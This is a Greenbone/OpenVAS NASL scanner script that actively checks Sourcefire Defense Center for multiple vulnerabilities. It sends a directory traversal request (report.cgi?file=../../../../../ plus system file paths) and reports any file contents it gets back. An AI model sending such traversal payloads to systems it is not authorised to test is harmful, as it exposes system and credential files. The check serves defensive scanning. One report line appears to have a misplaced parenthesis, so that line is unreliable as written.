# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103460");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-04-05 11:02:10 +0200 (Thu, 05 Apr 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sourcefire Defense Center < 4.10.2.3 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Sourcefire Defense Center is prone to multiple vulnerabilities,
  including multiple arbitrary file download vulnerabilities, an arbitrary file deletion
  vulnerability, a security bypass vulnerability, and an HTML injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting these vulnerabilities may allow an attacker to view
  or delete arbitrary files within the context of the application, gain unauthorized access and
  execute HTML and script code in the context of the affected site, steal cookie-based
  authentication credentials, or control how the site is rendered to the user. Information
  harvested may aid in launching further attacks.");

  script_tag(name:"affected", value:"Sourcefire Defense Center prior to version 4.10.2.3.");

  script_tag(name:"solution", value:"Update to version 4.10.2.3 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52887");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Apr/52");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

foreach dir (make_list_unique("/", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  url = dir + "/login.cgi";

  res = http_get_cache(port: port, item: url);
  if (!res || res !~ "^HTTP/1\.[01] 200" || "Sourcefire Inc" >!< res)
    continue;

  files = traversal_files();

  foreach pattern (keys(files)) {
    file = files[pattern];

    url = dir + "/ComparisonViewer/report.cgi?file=../../../../../" + file;

    if (passwd = http_vuln_check(port: port, url: url, pattern: pattern)) {
      report = "Url: " + http_report_vuln_url(port: port, url: url, url_only: TRUE +
               '\nResult:\n' + passwd);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
